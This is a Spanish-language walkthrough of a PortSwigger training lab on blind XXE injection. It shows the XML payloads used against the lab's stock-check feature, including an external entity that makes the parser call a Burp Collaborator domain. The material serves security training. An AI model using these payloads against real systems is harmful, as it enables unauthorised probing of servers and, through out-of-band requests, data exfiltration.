---
title: XXE Injection Lab 3
date: 2024-11-27 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - XXE Injection
tags:
  - XXE Injection
  - Blind XXE with out-of-band interaction
image:
  path: /assets/img/XXE-Injection-Lab-3/Portswigger.png
---

## Skills

- Blind XXE with out-of-band interaction

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este laboratorio tiene una función llamada `Check stock` que analiza la `entrada` en `formato XML` y `devuelve` cualquier `valor inesperado` en la respuesta. Puedes `detectar` la vulnerabilidad `blind XXE` provocando `out-of-band interactions` con un `dominio externo`. Para resolver el laboratorio, debemos utilizar una `entidad externa` para hacer que el analizador XML realice una `búsqueda DNS` y una `solicitud HTTP` hacia `Burp Collaborator`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/XXE-Injection-Lab-3/image_1.png)

Si pulsamos en `View details` veremos la `descripción` del `artículo`

![](/assets/img/XXE-Injection-Lab-3/image_2.png)

Si pulsamos en `Check stock` y `capturamos` la `petición` con `Burpsuite` vemos que se está tramitando un `XML`

![](/assets/img/XXE-Injection-Lab-3/image_3.png)

Vamos a insertar un `DTD (Document Type Definition)` y a `comprobar` si es `vulnerable` a `XXE`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe "Doe"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Nos vamos a `Burpsuite Collaborator` y pulsamos en `Copy to clipboard`, este dominio obtenido lo vamos a usar para construir este `payload`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://7qyhremmrjqjtk32uztkk5jai1osci07.oastify.com"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Nos vamos a `Burpsuite Collaborator` y observamos que hemos `obtenido respuesta`

![](/assets/img/XXE-Injection-Lab-3/image_4.png)
